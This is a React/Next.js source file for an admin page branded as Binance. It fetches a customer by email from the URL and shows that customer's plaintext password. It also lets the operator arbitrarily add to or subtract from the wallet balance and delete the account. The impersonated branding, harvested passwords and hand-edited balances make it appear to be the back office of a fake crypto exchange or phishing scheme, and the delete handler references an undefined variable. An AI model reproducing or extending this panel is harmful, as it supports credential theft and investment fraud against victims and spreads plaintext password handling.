import Head from 'next/head'
import axios from 'axios'
import Link from 'next/link'
import CurrencyFormat from "react-currency-format";
import { useState, useEffect, useRef } from 'react'
import { useDispatch, useSelector } from 'react-redux'
import { LockClosedIcon } from "@heroicons/react/solid"
import Loader from '../../components/loader'
import { setMessage } from '../../redux/APP_STATE/actions'

export default function AdminAllCustomers() {
  const dispatch = useDispatch()
  const amount = useSelector(state => state.APP_STATE.amount)
  const [user, setUser] = useState(null)
  const submit_form = useRef(null)
  const button_ref = useRef(null)

  useEffect( async () => {
    getCustomerInfo()
  }, [])

  const getCustomerInfo = async () => {
    // window.location.pathname.split('/')[1]  ---> This collects the email from the URL ROUTE!
    const res = await axios.post(`/api/single-user-info`, { email: window.location.pathname.split('/')[2] })
    res && setUser(res.data.customer)
  }

  const Handle_account_delete = async () => {
    if (user.role == 'admin') return dispatch(setMessage('Sorry can\'t delete Admin'))
    
    const isTrue = window.confirm('Are you sure, confirm to delete this customer')
    if (isTrue) {
        try {
            const res = await axios.post('/api/delete-user-account', { id: data._id })
            res && console.log('Delete Account Done', res.data)
            res && dispatch(setMessage(res.data.msg))
        }
        catch (e) {
            console.log('ERR couldn\'t Delete Account')
            dispatch(setMessage('ERR couldn\'t Delete Account'))
        }
    }
  }
  
  const Handle_balance_update = async (e) => {
    e.preventDefault()

    const btn = button_ref.current
    const form = submit_form.current
    const amount = form.amount.value
    const depositCondition = form.depositCondition.value
    let options = {
        amount,
        depositCondition,
        email: user.email
    }

    // Start Loading...
    btn.disabled = true
    btn.textContent = 'Funding...'

    try {
        const res = await axios.post('/api/wallet-update', options)
        
        if (res) {
          dispatch(setMessage(res.data.msg))
          getCustomerInfo()

          // Stop Loading
          btn.disabled = false
          btn.textContent = 'Submit'
        }
    }
    catch (e) {
        // End loading
        btn.disabled = false
        btn.textContent = 'Updated'
        console.log('ERR couldn\'t update customers wallet balance')
        dispatch(setMessage('ERR couldn\'t update customers wallet balance'))
    }
}

  return (
    <div id="wrapper" className='text-sm font-ibm_plex text-gray-800 h-[100vh]'>
        <Loader />
      <Head>
        <title>Administrator - Panel | Binance</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      {/* HEADER */}
      <div id="Header" className='flex justify-between p-5'>
        <div className="logo">
          <img className='h-6' src="/binance-logo.svg" alt="Logo" />
        </div>
        <div className="menu">English |</div>
      </div>

      {/* ====================== TABLE SECTION ==================== */}
      <div className="container px-5 max-w-4xl">
          <div className="card">
              <div className="info my-4">
                <h1 className="text-lg font-semibold my-2">Email</h1>
                <p>{ user?.email }</p>
              </div>
              <div className="info my-4">
                <h1 className="text-lg font-semibold my-2">Password</h1>
              <p>{ user?.password }</p>
              </div>
          </div>
          <div className="card">
              <div className="info my-4">
                <h1 className="text-lg font-semibold my-2">Account Balance</h1>
                <p>
                  <CurrencyFormat
                    renderText={(value) => (
                        <>
                        <span>{value}</span>
                        </>
                    )}
                    value={user ? user.wallet : 0}
                    decimalScale={2}
                    fixedDecimalScale={true}
                    thousandSeparator={true}
                    displayType={"text"}
                    prefix={"$"}
                />
                </p>
              </div>
            
          </div>
            <div className="card">
              <h1 className="text-lg font-semibold my-2">Fund Account Balance</h1>
              <form onSubmit={ Handle_balance_update } ref={ submit_form }>
                  <div className="input_field">
                      <select name="depositCondition" className="w-full text-center px-2 py-4 bg-gray-100 rounded-md outline-none border" required>
                          <option value="">Select</option>
                          <option value="add">ADD_VALUE_TO_BALANCE</option>
                          <option value="subtract">DEDUCT_VALUE_FROM_BALANCE</option>
                      </select>
                    </div>
                  <div className="input_field">
                      <input type="number" name='amount' placeholder='Enter amount' className="w-full text-center rounded-md px-2 py-4 bg-gray-100" />
                    </div>
                    <div className="input_field">
                        <button ref={ button_ref } className="btn px-5 py-3.5 w-full bg-green-600 text-white">Submit</button>
                    </div>
              </form>
        </div>
        <div className="card mb-10 bg-red-50">
        <h1 className="text-lg text-gray-500 font-semibold my-2">Danger Zone</h1>
          <button onClick={ Handle_account_delete } className="btn mx-auto block my-16 px-6 py-3 bg-red-500 text-white font-semibold">Delete Account</button>
        </div>
      </div>
    </div>
  )
}
